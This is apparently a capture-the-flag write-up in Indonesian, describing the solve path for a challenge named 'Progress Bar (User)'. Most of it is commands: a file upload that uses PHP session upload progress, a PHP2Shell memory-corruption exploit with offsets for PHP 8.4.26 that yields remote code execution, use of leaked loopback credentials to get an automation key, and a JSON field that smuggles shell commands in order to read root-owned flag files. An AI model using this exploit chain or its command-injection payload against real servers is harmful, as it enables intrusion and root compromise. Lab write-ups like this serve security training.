# Progress Bar (User) — Eksploitasi / Solver

[← Overview](15-progress-bar-user.md) · [Index](index.md)

### 3.1 Strategi

1. Fingerprint PHP 8.4.26 mod_php dan form upload.
2. Siapkan script enumerasi (`/out/c`) dan upload lewat `upload.php`.
3. Jalankan PHP2Shell untuk RCE `www-data` dengan command `sh</out/c`.
4. Baca `/out/recon.txt`, `/out/src.txt`, `/out/ucp.txt`.
5. Dari source, ambil kredensial UCP → automation key.
6. Command injection di automation root untuk membaca user flag.

### 3.2 Langkah exploit

#### a) Upload script payload

Script `c` berisi enumerasi dan penulisan hasil ke `/out/`. Upload memakai form
biasa; `PHP_SESSION_UPLOAD_PROGRESS=x` diperlukan agar jalur session aktif.

```bash
curl -sS -F 'PHP_SESSION_UPLOAD_PROGRESS=x' \
  -F 'file=@script;filename=c' \
  http://10.10.20.22/upload.php
```

Script yang dipakai di notes adalah enumerasi `c22_recon.sh`/`c22_src.sh`:
mengumpulkan `id`, `hostname`, `uname -a`, isi `/etc/passwd`, proses, port
listen, response HTTP loopback, daftar file, dan source `/opt/*/app.py`.
Hasilnya ditulis ke `/out/recon.txt`, `/out/src.txt`, `/out/ucp.txt`.

#### b) Jalankan PHP2Shell

```bash
cd /tmp/p2s
python3 exploit.py -u http://10.10.20.22/index.php \
  --offsets-file '' --no-auto-offsets --proof-file '' --fetch /out/p1 \
  -c 'sh</out/c' \
  --zif-offset 0x465370 --dtor-offset 0x65eb60 \
  --htdata-offset 0x690d8 --huge-mb 12 --retries 3 --timeout 90
```

Penjelasan opsi:

- `--offsets-file '' --no-auto-offsets`: target remote, jadi offset tidak
  diambil dari container lokal.
- `--proof-file ''`: tidak membaca file proof lokal.
- `--fetch /out/p1`: setelah RCE, ambil `/out/p1` lewat HTTP.
- `-c 'sh</out/c'`: command 8 byte, di bawah batas 14 byte.
- Offset official PHP 8.4.26 trixie amd64:
  `zif_system=0x465370`, `ZVAL_PTR_DTOR=0x65eb60`, `htdata=0x690d8`.
- `--huge-mb 12`: field 12 MB untuk memicu OOM/worker rotation.
- `--retries 3`, `--timeout 90`: retry per stage.

Output stdout exploit tidak tersimpan di notes. Bukti eksekusi adalah file
`/out/recon.txt`, `/out/src.txt`, `/out/ucp.txt`, `/out/root.txt` yang dibuat
script dan bisa diambil lewat HTTP.

#### c) Enumerasi loopback

Dari `www-data`, jalankan script UCP:

```bash
rm -f /tmp/jar
curl -sS -i -c /tmp/jar -b /tmp/jar \
  -d 'username=ucp-template&password=Pr0gr3ssB4r_2026' \
  http://127.0.0.1:8080/ucp/login
curl -sS -i -c /tmp/jar -b /tmp/jar -d 'widget=voicemail' \
  http://127.0.0.1:8080/ucp/widgets
curl -sS -i -c /tmp/jar -b /tmp/jar http://127.0.0.1:8080/ucp/inbox
```

Inbox menampilkan:

```html
<p>Rotation reminder: the automation worker key is
<code>PB_AUTO_7b3f9a1c4e0d2f6a</code>.
Keep it inside the loopback operations network.</p>
```

#### d) Command injection root

```bash
KEY=PB_AUTO_7b3f9a1c4e0d2f6a
curl -sS -X POST http://127.0.0.1:9000/jobs/export \
  -H "Authorization: Bearer $KEY" -H 'Content-Type: application/json' \
  --data-binary '{"report":"x; id; echo ---CAT---; cat /root/root.txt /home/deploy/user.txt 2>&1 #"}'
```

`report` menjadi:

```text
tar czf /var/automation/exports/x; id; echo ---CAT---; cat /root/root.txt /home/deploy/user.txt 2>&1 #.tgz /var/automation/data 2>&1
```

Bagian setelah `;` dieksekusi oleh shell sebagai root. `#` mengabaikan sisa
command.

### 3.3 Output

```text
uid=0(root) gid=0(root) groups=0(root)
---CAT---
NFX{fr0m_w4tcht0w3r_c0nf1g_t0_r00t_3xp0rt_j0b}
NFX{pr0gr3ss_b4r_qu3u3_st4g1ng_pwn3d_4s_www_d4t4}
```

Baris pertama adalah root flag (challenge Root), baris kedua adalah user flag
(challenge ini). `user.txt` berukuran 50 byte, mode `400`, owner
`deploy:deploy`.
